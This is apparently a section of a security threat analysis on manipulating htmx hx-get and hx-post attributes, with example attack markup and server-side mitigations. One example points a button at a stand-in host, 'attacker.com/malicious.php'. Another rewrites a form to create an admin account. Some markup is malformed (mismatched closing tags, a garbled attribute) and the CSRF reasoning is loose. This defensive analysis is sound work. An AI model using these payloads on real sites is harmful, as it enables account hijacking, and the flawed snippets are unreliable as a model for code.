In this section, we will explore the various ways in which an attacker can manipulate the `hx-get` attribute to trigger unintended actions.

**2.2.1.  `hx-get` Attribute Manipulation

The `hx-get` attribute is used to specify the URL to which an AJAX GET request is sent when an element is triggered.  This is a prime target for manipulation.

**Attack Vector:  Cross-Site Request Forgery (CSRF) Exploitation**

*   **Description:**  If an attacker can manipulate the `hx-get` attribute, they can potentially trick the user into making requests to arbitrary URLs.  This is particularly dangerous if the target URL performs actions that require authentication.  If the user is already authenticated to the target site, the attacker can leverage the user's session to perform actions without their knowledge.

*   **Example:**

    ```html
    <button hx-get="/delete-account" hx-target="#account-info">Delete Account</p>
    ```

    An attacker could change this to:

    ```html
    <button hx-get="https://attacker.com/malicious.php" hx-target="#account-info">Delete Account</p>
    ```

    When the user clicks the button, thinking they are deleting their account, they are instead sending a GET request to the attacker's server.  The attacker's server could then perform any action, such as stealing session cookies, redirecting to a phishing page, or even making changes to the user's account if the target site is vulnerable to CSRF.

*   **Mitigation:**

    *   **CSRF Tokens:** Implement robust CSRF protection on the server-side.  The server should generate a unique, unpredictable token for each session and include it in a hidden field within forms or as a custom HTTP header.  The server should then verify this token on every state-changing request (POST, PUT, DELETE, etc.).  htmx can be configured to include this token automatically using `hx-headers` or `hx-vals`.

        ```html
        <meta name="csrf-token" content="YOUR_CSRF_TOKEN">

        <script>
        document.body.addEventListener('htmx:configRequest', function(evt) {
          evt.detail.headers['X-CSRF-Token'] = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
        });
        </script>
        ```

    *   **Referer Header Validation (Less Reliable):**  The server can check the `Referer` header to ensure the request originated from the expected domain.  However, this is not foolproof, as the `Referer` header can be manipulated or omitted.  It's best used as a secondary defense, not the primary one.

    *   **SameSite Cookies:**  Use `SameSite=Strict` or `SameSite=Lax` cookies to restrict the sending of cookies with cross-origin requests.  This helps prevent CSRF attacks where the attacker's site triggers the request.

    *   **Avoid GET for Sensitive Actions:**  Avoid using `hx-get` for actions that modify data or perform sensitive operations.  Use `hx-post` instead, which is less susceptible to simple CSRF attacks (though still requires CSRF protection).

**2.2.2.  `hx-post` Attribute Manipulation**

The `hx-post` attribute is used to specify the URL to which an AJAX POST request is sent.  While POST requests are generally less vulnerable to simple CSRF than GET requests, they are still vulnerable to manipulation.

*   **Attack Vector:  Data Modification/Injection**

    *   **Description:**  An attacker could change the `hx-post` URL to point to a different endpoint, potentially one that accepts different parameters or performs different actions.  This could allow the attacker to inject malicious data, bypass validation, or perform unauthorized actions.

    *   **Example:**

        ```html
        <form hx-post="/update-profile">
            <input type="text lesquoname="username" value="user123">
            <button type="submit">Update Profile</button>
        </form>
        ```

        An attacker could change this to:

        ```html
        <form hx-post="/admin/create-user">
            <input type="text" name="username" value="attacker">
            <input type="text" name="password" value="password123">
            <input type="text" name="role" value="admin">
            <button type="submit">Update Profile</button>
        </form>
        ```

        If the server doesn't properly validate the request and the user has sufficient privileges, the attacker might be able to create an administrator account.

*   **Mitigation:**

    *   **Strict Input Validation:**  The server *must* validate *all* input received, regardless of the `hx-post` attribute.  This includes data type, length, format, and allowed values.  Never trust client-side validation alone.
    *   **Endpoint Authorization:**  Ensure that the endpoint receiving the POST request is properly authorized.  Check that the user has the necessary permissions to perform the intended action.  This is crucial to prevent privilege escalation.
    *   **Parameter Whitelisting:**  Only accept expected parameters.  Reject any unexpected parameters sent in the request.  This prevents attackers from injecting malicious data into unexpected fields.
